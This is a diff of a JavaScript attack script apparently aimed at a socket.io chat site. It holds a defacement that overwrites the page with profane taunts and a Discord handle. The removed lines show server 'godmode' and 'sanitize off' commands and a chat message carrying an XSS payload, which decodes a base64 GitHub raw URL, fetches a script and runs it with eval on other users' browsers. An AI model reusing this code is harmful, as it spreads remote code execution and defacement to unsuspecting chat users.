@@ -1,4 +1,3 @@
-socket.emit('command', { list: ['godmode'] });
 const audioUrl = 'https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/hdfghdfghdfghdfg.wav?raw=true';
 function playAudioWithRetry(url, maxRetries = 5, delay = 1000) {
   let attempts = 0;
@@ -18,8 +17,7 @@ function playAudioWithRetry(url, maxRetries = 5, delay = 1000) {
   attemptPlay();
 }
 playAudioWithRetry(audioUrl);
-socket.emit('command', { list: ['sanitize', 'off'] });
-socket.emit('talk', { text: "GET UNIVERSAL FUCKED BY THE NYX RAS STUDIOS COME ON AND JOIN BONZIWORLD YOU FUCKERS https://bonziworld.kr <script>fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`NYX`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
+socket.emit('talk', { text: "LMFAO YOU CAN'T GET HACKED FOR 1 QUETCOSECOND" });
 (function() {
     const bgUrl = "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/image_2026-09-22_184623421.png?raw=true";
     document.documentElement.innerHTML = `
@@ -48,7 +46,7 @@ socket.emit('talk', { text: "GET UNIVERSAL FUCKED BY THE NYX RAS STUDIOS COME ON
             </style>
         </head>
         <body>
-            <h1>GET FUCKED BY NYXRAS YOU ARE GOING TO JOIN BONZIWORLD.KR</h1>
+            <h1>GET FUCKED BY NYXRAS<br>contact on discord: ivorydevrimoqr</h1>
         </body>
         </html>
     `;
